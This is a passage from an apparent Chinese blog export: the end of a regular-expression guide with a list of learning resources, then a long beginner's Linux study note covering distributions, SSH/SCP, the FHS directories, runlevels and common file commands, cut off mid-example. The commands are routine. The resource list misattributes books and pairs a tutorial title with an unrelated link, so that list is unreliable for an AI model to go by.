style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">《正则表达式权威指南》</td><td style="text-align:left">杰夫·弗里德劳</td><td style="text-align:left">全面深入地介绍了正则表达式的原理、语法和应用，适合初学者和进阶读者</td></tr><tr><td style="text-align:left">《精通正则表达式》</td><td style="text-align:left">杰夫·弗里德劳</td><td style="text-align:left">详细讲解了正则表达式的高级技巧和优化方法，适合有一定基础的读者</td></tr><tr><td style="text-align:left">《正则表达式 Pocket 参考》</td><td style="text-align:left">杰夫·弗里德劳</td><td style="text-align:left">精简实用的正则表达式参考手册，适合随时查阅</td></tr></tbody></table></div><h3 id="（二）在线教程"><a href="#（二）在线教程" class="headerlink" title="（二）在线教程"></a>（二）在线教程</h3><div class="table-container"><table><thead><tr><th style="text-align:left">网站名称</th><th style="text-align:left">网址</th><th style="text-align:left">特点</th></tr></thead><tbody><tr><td style="text-align:left">MDN Web Docs</td><td style="text-align:left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions</a></td><td style="text-align:left">详细的正则表达式教程，涵盖语法、示例和常见应用，适合 JavaScript 开发者</td></tr><tr><td style="text-align:left">Runoob</td><td style="text-align:left"><a href="https://www.runoob.com/regexp/regexp-tutorial.html">https://www.runoob.com/regexp/regexp-tutorial.html</a></td><td style="text-align:left">简洁易懂的正则表达式教程，包含丰富的示例和练习，适合初学者</td></tr><tr><td style="text-align:left">W3School</td><td style="text-align:left"><a href="https://www.w3schools.com/js/js_regexp.asp">https://www.w3schools.com/js/js_regexp.asp</a></td><td style="text-align:left">提供正则表达式的基础教程和示例，适合快速入门</td></tr></tbody></table></div><h3 id="（三）视频教程"><a href="#（三）视频教程" class="headerlink" title="（三）视频教程"></a>（三）视频教程</h3><div class="table-container"><table><thead><tr><th style="text-align:left">平台名称</th><th style="text-align:left">视频名称</th><th style="text-align:left">特点</th></tr></thead><tbody><tr><td style="text-align:left">Bilibili</td><td style="text-align:left"><a href="https://search.bilibili.com/video?keyword=正则表达式从入门到精通">正则表达式从入门到精通</a></td><td style="text-align:left">详细的正则表达式讲解，包含大量实例和练习，适合初学者和进阶读者</td></tr><tr><td style="text-align:left">YouTube</td><td style="text-align:left"><a href="https://www.youtube.com/watch?v=aircAruvnKk">Regular Expressions Tutorial for Beginners</a></td><td style="text-align:left">由 freeCodeCamp 提供的正则表达式入门教程，内容清晰，适合初学者</td></tr><tr><td style="text-align:left">Udemy</td><td style="text-align:left"><a href="https://www.udemy.com/course/complete-regular-expressions-course/">The Complete Regular Expressions Course</a></td><td style="text-align:left">全面的正则表达式课程，涵盖基础和高级内容，提供实践项目和练习</td></tr></tbody></table></div><h2 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h2><p>正则表达式是一种强大的文本处理工具，广泛应用于数据验证、信息提取、文本替换等领域。掌握正则表达式的基本语法和应用场景，可以帮助开发者更高效地处理文本数据。通过不断学习和实践，可以逐渐掌握正则表达式的高级技巧，解决复杂的文本处理问题。</p><p>在学习和使用正则表达式时，需要注意性能优化、特殊字符转义、贪心与非贪心匹配等问题。利用在线工具和学习资源，可以更轻松地理解和掌握正则表达式的使用方法。</p>]]></content>
      
      
      <categories>
          
          <category> Coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux操作系统</title>
      <link href="/posts/6f6343c5.html"/>
      <url>/posts/6f6343c5.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>更新一篇超长的Linux操作系统的学习笔记，主要是一些概念和基本操作。认真学完的话，离大佬也是更近一步了</p></blockquote><h1 id="Linux操作系统概述"><a href="#Linux操作系统概述" class="headerlink" title="Linux操作系统概述"></a>Linux操作系统概述</h1><h2 id="一：Linux操作系统概述"><a href="#一：Linux操作系统概述" class="headerlink" title="一：Linux操作系统概述"></a>一：Linux操作系统概述</h2><h3 id="Linux操作系统介绍及作用"><a href="#Linux操作系统介绍及作用" class="headerlink" title="Linux操作系统介绍及作用"></a>Linux操作系统介绍及作用</h3><p>目前业界客户端大多采用Windows系统，而服务端大多数使用的是Linux，究其根源主要是开源免费，安全性高，支持多用户，支持关闭任意不需要的功能和对硬件资源要求低等因素。同时，Linux也是众多开源产品首先支持的平台，也是实际意义上的服务器和云平台的标准，包括众多安全设备，其内置的也是Linux操作系统（如防火墙，路由器，交换机，IDS和IPS，网闸等产品），对于网络安全的学习来说，掌握Linux操作系统起着至关重要的作用。</p><h3 id="操作系统的作用"><a href="#操作系统的作用" class="headerlink" title="操作系统的作用"></a>操作系统的作用</h3><ul><li>五大基本功能<ul><li>进程和线程的管理</li><li>存储管理</li><li>文件管理</li><li>设备管理</li><li>用户接口</li></ul></li><li>三个作用<ul><li>资源的管理者</li><li>向用户提供了一个服务</li><li>对硬件机器的扩展</li></ul></li></ul><h3 id="内核（Kernel）"><a href="#内核（Kernel）" class="headerlink" title="内核（Kernel）"></a>内核（Kernel）</h3><p>内核是操作系统的核心，是基于硬件的第一层软件扩充，提供操作系统的基本功能，是操作系统工作的基础。它负责管理系统的进程、内存、设备驱动程序、文件和网络系统，决定着系统的性能和稳定性。</p><h3 id="壳（Shell）"><a href="#壳（Shell）" class="headerlink" title="壳（Shell）"></a>壳（Shell）</h3><p>提供了命令接口，通俗点来说就是让用户直接操作内核的程序。通用的操作系统都要提供一个称为shell（外壳）的程序，用户使用这个程序来操作计算机系统进行工作。</p><h3 id="应用程序（Application）"><a href="#应用程序（Application）" class="headerlink" title="应用程序（Application）"></a>应用程序（Application）</h3><p>用户平时接触的程序。</p><h3 id="Linux操作系统版本"><a href="#Linux操作系统版本" class="headerlink" title="Linux操作系统版本"></a>Linux操作系统版本</h3><p>Linux起源于Unix，因为开源免费的特性，吸引了很多厂商开发维护，渐渐形成了很多版本。</p><ul><li>RedHat：RHEL（Red Hat Enterprise Linux）是商业版Linux系统，多用于企业生产环境，提供完善的商业支持，在性能、稳定性方面有保障。</li><li>Debian：Debian和Ubuntu是一个派系的，但界面可能没有Ubuntu那么华丽，比较稳定，适合用作服务器操作系统。Debian在开源圈子用得十分广泛，也有一大批开源爱好者活跃于其中。</li><li>中科红旗：红旗Linux由北京中科红旗软件技术有限公司开发，包括桌面版、工作站版、数据中心服务器版、HA集群版和红旗嵌入式Linux等产品。红旗Linux是中国较大、较成熟的Linux发行版之一，2014年被大连五甲万京信息科技产业集团收购。</li><li>Ubuntu：Ubuntu界面比较华丽，包管理器很完善，社区也非常活跃，个人用户较多，从市面上看比较大众化。</li><li>CentOS：CentOS基于RedHat商业版系统的社区编译重发布版，完全开源免费，相较于其他一些免费的Linux发行版会更加稳定，因此一般企业里常用作服务器操作系统。</li><li>Fedora：Fedora与RedHat同属一个派系，背后的支撑企业也是红帽子公司。但Fedora是免费发行版，侧重于新技术的试验和加持，稳定性方面的考量较CentOS稍次要一些。</li><li>SUSE：SUSE背后有大公司支持，目前主要多用于企业用户。</li><li>Arch：Arch适合好奇心强的人尝鲜，官方Wiki做得好，AUR仓库繁荣，适合DIY玩家折腾，确实也吸引了不少粉丝。</li><li>Manjaro：Manjaro可看成是Arch Linux的衍生分支，包含了Arch的常见优点，但对用户更友好，注重体验和稳定性。Manjaro的安装和使用都比较方便，目前使用用户非常多。</li><li>Gentoo：Gentoo适合极客范化的折腾，也比较适合有特殊需要和特殊化定制的需求，总体来说比较小众。但用得很6的大佬们都说好，因为这些大佬们大多有系统洁癖，控制欲很强，什么都需要自己编译、自己定制，这个对他们来说简直就是天堂了。</li><li>Kali：Kali是一个面向安全的基于Debian的Linux发行版，预装了大量的安全软件。其主要功能有三个：数字取证、安全审计、渗透测试。Kali首先是一个操作系统，更确切地说是一个基于Linux kernel的操作系统，从BackTrack发展而来。而BT是2006年推出的一个用于渗透测试及黑客攻防的专用平台，基于Knoppix（Linux的一个发行版）开发。Backtrack从2006年的起始版本BackTrack v.1.0Beta开始，到2012年推出最终版本BackTrack 5 R3 release。之后，2013年offensive Security的Mati Aharoni和Devon Kearns基于Debian重新实现了BackTrack，新的产品命名为Kali，从此Kali成为BackTrack的后继者。</li></ul><p>通常情况下，服务器端操作系统（Windows, Linux）不会安装GUI界面，只有一个内核加Shell，再加少量命令行。</p><h2 id="二：Linux系统安装"><a href="#二：Linux系统安装" class="headerlink" title="二：Linux系统安装"></a>二：Linux系统安装</h2><p>这里以安装CentOS7为例，具体安装过程可参考以下链接：</p><ul><li><a href="https://www.bilibili.com/video/BV1SY411p7F9/?p=119&amp;vd_source=7c5a0745447222c9296499649d0a816">https://www.bilibili.com/video/BV1SY411p7F9/?p=119&amp;vd_source=7c5a0745447222c9296499649d0a816</a>  </li><li><a href="https://blog.csdn.net/qq_45743985/article/details/121152504">https://blog.csdn.net/qq_45743985/article/details/121152504</a>  </li></ul><h2 id="三：使用XShell远程连接Linux"><a href="#三：使用XShell远程连接Linux" class="headerlink" title="三：使用XShell远程连接Linux"></a>三：使用XShell远程连接Linux</h2><h3 id="SSH协议介绍"><a href="#SSH协议介绍" class="headerlink" title="SSH协议介绍"></a>SSH协议介绍</h3><p>SSH（Secure Shell）是安全外壳协议，是一种加密的网络传输协议，可在不安全的网络中为网络服务提供安全的传输环境。它通过在网络中创建安全隧道来实现SSH客户端和服务器之间的连接。SSH将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为所有操作系统的标准配置。</p><h3 id="XShell使用"><a href="#XShell使用" class="headerlink" title="XShell使用"></a>XShell使用</h3><p>贴一篇参考文章： <a href="https://blog.csdn.net/weixin_47230291/article/details/126905158">https://blog.csdn.net/weixin_47230291/article/details/126905158</a>  </p><p>在连接之前最好先配置一下要连接的Linux主机的IP。</p><p>Linux配置IP参考：<a href="https://blog.csdn.net/u010521062/article/details/114067036">https://blog.csdn.net/u010521062/article/details/114067036</a>  </p><p>进入XShell后点击新建，进行配置，就连接成功了。</p><h3 id="SSH与SCP命令"><a href="#SSH与SCP命令" class="headerlink" title="SSH与SCP命令"></a>SSH与SCP命令</h3><ul><li>SSH命令<ul><li>Windows及Linux都自带了针对SSH远程连接的命令。如果电脑上没有安装XShell等工具，可以直接用系统自带的服务进行远程连接。<ul><li>Windows连接：<code>ssh -l 用户名 IP</code> 或 <code>ssh root@192.168.2.112</code>，然后输入密码。</li><li>Linux连接：<code>ssh root@192.168.2.112</code></li></ul></li></ul></li><li>SCP命令<ul><li>从Windows上传文件到Linux：<code>scp F:\Photo\ico\1.ico root@192.168.2.112:/opt</code></li><li>从Linux下载文件到Windows：<code>C:\Users\Denny&gt;scp root@192.168.112.225:/opt/test.html E:\</code></li></ul></li></ul><h3 id="移动端SSH客户端工具"><a href="#移动端SSH客户端工具" class="headerlink" title="移动端SSH客户端工具"></a>移动端SSH客户端工具</h3><ul><li>JuiceSSH</li><li>Termius</li><li>…</li></ul><h2 id="四：Linux系统操作"><a href="#四：Linux系统操作" class="headerlink" title="四：Linux系统操作"></a>四：Linux系统操作</h2><h3 id="文件系统解读"><a href="#文件系统解读" class="headerlink" title="文件系统解读"></a>文件系统解读</h3><p>在Linux下运行<code>df -h</code>命令，可以查看目前Linux中存在的硬盘分区情况及每个分区的磁盘使用情况。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@mycentos mysql]# <span class="built_in">df</span> -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">devtmpfs        900M     0  900M   0% /dev</span><br><span class="line">tmpfs           910M     0  910M   0% /dev/shm</span><br><span class="line">tmpfs           910M  9.5M  901M   2% /run</span><br><span class="line">tmpfs           910M     0  910M   0% /sys/fs/cgroup</span><br><span class="line">/dev/sda3        39G  1.9G   37G   5% /</span><br><span class="line">/dev/sda5        19G   33M   19G   1% /home</span><br><span class="line">/dev/sda1      1014M  142M  873M  14% /boot</span><br><span class="line">tmpfs           182M     0  182M   0% /run/user/0</span><br></pre></td></tr></table></figure><ul><li><code>filesystem</code>：文件系统</li><li><code>size</code>：分区大小</li><li><code>used</code>：已使用空间</li><li><code>avail</code>：剩余空间</li><li><code>use%</code>：使用率百分比</li><li><code>mounted on</code>：挂载到哪个目录上</li></ul><p>对上述挂载目录的简单说明：</p><ul><li><code>/dev</code>：所有Linux系统使用的外部设备都以文件的形式存在这个目录中。</li><li><code>/dev/shm</code>：存在于内存中，用于优化系统性能。该分区的大小通常是系统内存的一半大小，用于存储临时数据，速度比硬盘快。</li><li><code>/run</code>：存放运行时数据，属于内核级文件。</li><li><code>/sys/fs/cgroup</code>：存放关于运行过程中CPU、内存等资源的数据，属于内核级文件。</li><li><code>/</code>：根目录，用于存储操作系统文件和其他用户数据。</li><li><code>/boot</code>：存放内核和引导过程所需的文件。</li><li><code>/home</code>：普通用户的根目录，类似Windows下的<code>C:\Users</code>目录。</li><li><code>/run/user/0</code>：保存用户ID为0（通常是root用户）在运行过程中产生的数据。</li></ul><h3 id="Linux目录说明"><a href="#Linux目录说明" class="headerlink" title="Linux目录说明"></a>Linux目录说明</h3><p>根目录是整个系统最重要的目录，所有目录都由根目录衍生而来。根目录与开机、还原、系统修复有关，因此FHS（Filesystem Hierarchy Standard）要求根目录保持较小，应用程序安装的软件应避免与根目录放在同一个分区。</p><p>根据FHS标准，根目录下应包含以下子目录：</p><div class="table-container"><table><thead><tr><th>目录</th><th>应放置文件内容</th></tr></thead><tbody><tr><td>/bin</td><td>存放单用户维护模式下可用的指令，供root和普通用户使用，如cat、chmod、chown、date、mv、mkdir、cp、bash等常用命令</td></tr><tr><td>/boot</td><td>存放开机所需的文件，包括Linux内核文件（如vmlinuz）和开机菜单及设置文件。若使用grub作为开机管理程序，则存在/boot/grub/目录</td></tr><tr><td>/dev</td><td>所有设备和周边硬件都以文件形式存在此目录中，如/dev/null、/dev/zero、/dev/tty、/dev/lp<em>、/dev/hd</em>、/dev/sd*等</td></tr><tr><td>/etc</td><td>存放系统主要配置文件，如用户账号密码文件、服务启动文件等。一般用户可查阅但只有root有修改权限。FHS建议不放置可执行文件于此目录。重要文件包括/etc/inittab、/etc/init.d/、/etc/modprobe.conf、/etc/X11/、/etc/fstab、/etc/sysconfig/等。重要目录有/etc/init.d/（所有服务的启动脚本）、/etc/xinetd.d/（super daemon管理服务设置文件）、/etc/X11/（X Window设置文件）</td></tr><tr><td>/home</td><td>系统默认的用户家目录。新增用户时，家目录默认在此创建。用<code>~</code>表示当前用户家目录，<code>~guest</code>表示用户名为guest的家目录</td></tr><tr><td>/lib</td><td>存放开机及/bin或/sbin目录下指令所需的函数库和内核模块。/lib/modules/存放内核相关模块（驱动程序）</td></tr><tr><td>/media</td><td>可移动设备（如软盘、光盘、DVD）的挂载点，常见挂载点如/media/floppy、/media/cdrom</td></tr><tr><td>/mnt</td><td>用于临时挂载额外设备，现代Linux中通常用于挂载可移动设备</td></tr><tr><td>/opt</td><td>第三方软件的安装目录。如KDE桌面管理系统或用户自行安装的软件可放在此目录</td></tr><tr><td>/root</td><td>系统管理员root的家目录，与根目录同分区，用于单用户维护模式下root用户操作</td></tr><tr><td>/sbin</td><td>存放系统设置指令，如fdisk、fsck、ifconfig、init、mkfs等，供root用户使用</td></tr><tr><td>/srv</td><td>网络服务启动后所需数据的存放目录，如WWW、FTP服务的数据</td></tr><tr><td>/tmp</td><td>供用户和程序临时存储文件的目录，任何用户均可访问，需定期清理。FHS建议开机时删除/tmp下的数据</td></tr><tr><td>/lost+found</td><td>ext2/ext3文件系统格式下特有的目录，用于存放文件系统错误时的遗失片段</td></tr><tr><td>/proc</td><td>虚拟文件系统，存放内存中的数据，如系统核心、进程信息、硬件状态及网络状态。不占硬盘空间，常用文件如/proc/cpuinfo、/proc/dma、/proc/interrupts、/proc/ioports、/proc/net/*、/proc/meminfo</td></tr><tr><td>/sys</td><td>与/proc类似，也是虚拟文件系统，记录核心相关的信息，如已加载的核心模块和硬件装置信息。同样不占硬盘容量</td></tr></tbody></table></div><p>通常，可以使用<code>/opt</code>和<code>/home</code>目录，这两个目录由用户自由处理，不存在敏感文件，也可以将程序安装在<code>/opt/</code>目录下，默认情况下，程序安装路径会在<code>/usr/bin</code>或<code>/var</code>目录下。</p><h3 id="Linux的启动级别"><a href="#Linux的启动级别" class="headerlink" title="Linux的启动级别"></a>Linux的启动级别</h3><p>Linux共有七个启动级别（0-6），使用<code>init</code>命令切换启动级别。语法为：<code>init 启动级别号</code>。<code>/etc/inittab</code>文件用于设置默认启动级别。</p><p>启动级别说明：</p><div class="table-container"><table><thead><tr><th>级别号</th><th>级别名称</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>停机模式</td><td>系统默认运行级别不能设置为0，否则无法正常启动，机器处于关机状态</td></tr><tr><td>1</td><td>单用户模式</td><td>具有root权限，用于系统维护，禁止远程登录，无网络功能，类似Windows的安全模式</td></tr><tr><td>2</td><td>多用户模式</td><td>无NFS和网络支持</td></tr><tr><td>3</td><td>完整多用户文本模式</td><td>有NFS和网络支持，登录后进入命令行界面，是企业中服务器通用的启动模式</td></tr><tr><td>4</td><td>未使用</td><td>保留，一般不用，特殊情况下可做其他用途，如笔记本电脑电池快没电时切换至此模式进行设置</td></tr><tr><td>5</td><td>图形化模式</td><td>登录后进入图形GUI界面，是Linux系统带GUI的默认启动模式</td></tr><tr><td>6</td><td>重启模式</td><td>默认运行级别不能设置为6，否则系统会无限重启，无法正常启动。运行<code>init 6</code>会使机器重启</td></tr></tbody></table></div><h3 id="Linux的关机与重启"><a href="#Linux的关机与重启" class="headerlink" title="Linux的关机与重启"></a>Linux的关机与重启</h3><div class="table-container"><table><thead><tr><th>命令实例</th><th>作用</th></tr></thead><tbody><tr><td>reboot</td><td>重启</td></tr><tr><td>shutdown -r now</td><td>现在立刻重启</td></tr><tr><td>shutdown -r 11:30</td><td>等到11:30进行重启</td></tr><tr><td>shutdown -r +1</td><td>等一分钟后重启</td></tr><tr><td>halt</td><td>关机</td></tr><tr><td>shutdown -h now</td><td>现在立刻关闭系统</td></tr><tr><td>shutdown -h 11:30</td><td>等到11:30关闭系统</td></tr><tr><td>init 0</td><td>关机</td></tr><tr><td>init 6</td><td>重启</td></tr></tbody></table></div><h3 id="Linux常见命令使用"><a href="#Linux常见命令使用" class="headerlink" title="Linux常见命令使用"></a>Linux常见命令使用</h3><ul><li><p><code>top</code>命令：类似于Windows的任务管理器，可以查看CPU和内存使用情况，以及每个进程的资源消耗、进程ID等信息。按<code>q</code>或<code>Ctrl+c</code>退出。</p></li><li><p><code>ls</code>命令：列出目录内容，可查看文件权限、目录信息等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a 列出目录所有文件，包含隐藏文件</span><br><span class="line"><span class="built_in">ls</span> -A 列出除.及..的其它文件</span><br><span class="line"><span class="built_in">ls</span> -r 反序排列</span><br><span class="line"><span class="built_in">ls</span> -t 以文件修改时间排序</span><br><span class="line"><span class="built_in">ls</span> -S 以文件大小排序</span><br><span class="line"><span class="built_in">ls</span> -h 以易读大小显示</span><br><span class="line"><span class="built_in">ls</span> -l 除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来</span><br></pre></td></tr></table></figure></li><li><p><code>cd</code>命令：切换当前目录至指定目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> / 切换到根目录</span><br><span class="line"><span class="built_in">cd</span> /home 切换到home目录</span><br><span class="line"><span class="built_in">cd</span> - 切换到上一次工作路径</span><br><span class="line"><span class="built_in">cd</span> !$ 把上个命令的参数作为<span class="built_in">cd</span>参数使用</span><br></pre></td></tr></table></figure><p>注：<code>~</code>代表当前登录用户的主目录。</p></li><li><p><code>pwd</code>命令：查看当前工作目录路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span> 查看当前路径</span><br><span class="line"><span class="built_in">pwd</span> -P 查看软链接的实际路径</span><br></pre></td></tr></table></figure></li><li><p><code>mkdir</code>命令：创建文件夹。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> [选项] 目录名</span><br><span class="line">-m 对新建目录设置存取权限</span><br><span class="line">-p 可以创建多级目录，若路径中某些目录不存在，则自动创建</span><br></pre></td></tr></table></figure></li><li><p><code>rm</code>命令：删除文件或目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> [选项] 文件名</span><br><span class="line">-i 删除前逐一询问确认</span><br><span class="line">-f 即使文件为只读属性，也直接删除，无需确认</span><br><span class="line">-r 将目录及子目录中的文件一并删除</span><br></pre></td></tr></table></figure></li><li><p><code>mv</code>命令：移动文件或重命名文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> [选项] 源文件 目标文件</span><br><span class="line">-b 删除目标文件前创建备份</span><br><span class="line">-i 覆盖前询问</span><br><span class="line">-f 直接覆盖</span><br><span class="line">-n 不覆盖已有文件</span><br><span class="line">-u 仅在源文件较新或目标文件不存在时移动</span><br></pre></td></tr></table></figure><p>命令格式及运行结果：</p><p>|命令格式|运行结果|<br>|—-|—-|<br>|<code>mv source_file dest_file</code>|将源文件重命名为目标文件|<br>|<code>mv source_file dest_directory</code>|将文件移动到目标目录|<br>|<code>mv source_directory dest_directory</code>|若目标目录存在，将源目录移动到目标目录中；若目标目录不存在，则将源目录重命名为目标目录|<br>|<code>mv source_directory dest_file</code>|出错|</p><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> aaa bbb 将文件aaa重命名为bbb</span><br><span class="line"><span class="built_in">mv</span> info/ logs 将info目录移动到logs目录中（若logs不存在，则将info重命名为logs）</span><br><span class="line"><span class="built_in">mv</span> /usr/runoob/* . 将/usr/runoob下的所有文件和目录移到当前目录</span><br></pre></td></tr></table></figure></li><li><p><code>cp</code>命令：复制文件或目录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> [选项] 源文件 目标文件或目录</span><br><span class="line">-i 提示覆盖</span><br><span class="line">-r 复制目录及内容</span><br><span class="line">-a 保留文件时间属性</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -ai a.txt <span class="built_in">test</span> 复制a.txt到<span class="built_in">test</span>目录下，保持原文件时间，若存在则提示覆盖</span><br><span class="line"><span class="built_in">cp</span> -s a.txt link_a.txt 为a.txt创建符号链接link_a.txt</span><br></pre></td></tr></table></figure></li><li><p><code>cat</code>命令：连接文件并打印到标准输出设备。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> [选项] 文件名</span><br><span class="line">-n 显示行号</span><br><span class="line">-b 仅对非空白行显示行号</span><br><span class="line">-s 将连续多个空行压缩为一行</span><br><span class="line">-v 显示非打印字符</span><br><span class="line">-E 在行尾显示$</span><br><span class="line">-T 显示Tab为^I</span><br><span class="line">-A 等同于-vET</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> -n textfile1 &gt; textfile2 将textfile1的内容加上行号输出到textfile2</span><br><span class="line"><span class="built_in">cat</span> -b textfile1 textfile2 &gt;&gt; textfile3 将textfile1和textfile2的内容加上行号（忽略空白行）追加到textfile3</span><br><span class="line"><span class="built_in">cat</span> /dev/null &gt; /etc/test.txt 清空/etc/test.txt文件内容</span><br></pre></td></tr></table></figure></li><li><p><code>more</code>命令：分页显示文件内容。</p><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-n 定义屏幕大小为n行</span><br><span class="line">+/pattern 从每个文件显示前搜索该字符串，并从该字符串前两行开始显示</span><br><span class="line">-d 显示提示信息，禁用响铃</span><br><span class="line">-s 将连续多个空行显示为一行</span><br></pre></td></tr></table></figure><p>常用操作命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Enter 向下移动一行</span><br><span class="line">Ctrl+F 向下滚动一屏</span><br><span class="line">空格键 向下滚动一屏</span><br><span class="line">Ctrl+B 返回上一屏</span><br><span class="line">= 输出当前行的行号</span><br><span class="line">:f 输出文件名和当前行号</span><br><span class="line">V 调用vi编辑器</span><br><span class="line">!命令 调用Shell执行命令</span><br><span class="line">q 退出more</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more +3 text.txt 显示文件中从第3行起的内容</span><br><span class="line"><span class="built_in">ls</span> -l | more -5 通过管道使每次显示5行</span><br></pre></td></tr></table></figure></li><li><p><code>less</code>命令：与more类似，但可向前向后浏览。</p><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-i 忽略搜索时的大小写</span><br><span class="line">-N 显示每行行号</span><br><span class="line">-o &lt;文件名&gt; 将less输出保存到指定文件</span><br><span class="line">-s 显示连续空行为一行</span><br></pre></td></tr></table></figure><p>搜索用户名常用命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/字符串 向下搜索</span><br><span class="line">?字符串 向上搜索</span><br><span class="line">n 重复前一个搜索</span><br><span class="line">N 反向重复前一个搜索</span><br><span class="line">x 向后翻一页</span><br><span class="line">d 向后翻半页</span><br><span class="line">h 显示帮助界面</span><br><span class="line">Q 退出less</span><br><span class="line">u 向前滚动半页</span><br><span class="line">y 向前滚动一行</span><br><span class="line">空格键 向下滚动一行</span><br><span class="line">回车键 向下滚动一页</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | less -N 分页显示进程信息，并显示行号</span><br><span class="line">less 1.<span class="built_in">log</span> 2.<span class="built_in">log</span> 查看多个文件，使用n查看下一个，p查看前一个</span><br></pre></td></tr></table></figure></li><li><p><code>head</code>命令：显示文件开头内容，默认前10行。</p><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-n &lt;行数&gt; 指定显示的行数</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">head</span> 1.<span class="built_in">log</span> -n 20 显示1.<span class="built_in">log</span>文件的前20行</span><br><span class="line"><span class="built_in">head</span> -c 20 log2014.log 显示1.<span class="built_in">log</span>文件的前20字节</span><br><span class="line"><span class="built_in">head</span> -n -10 t.log 显示t.log文件除最后10行外的内容</span><br></pre></td></tr></table></figure></li><li><p><code>tail</code>命令：显示文件末尾内容，默认最后10行，常用于查看日志。</p><p>常用参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f 循环读取，用于动态查看日志更新</span><br><span class="line">-n &lt;行数&gt; 指定显示的行数</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span 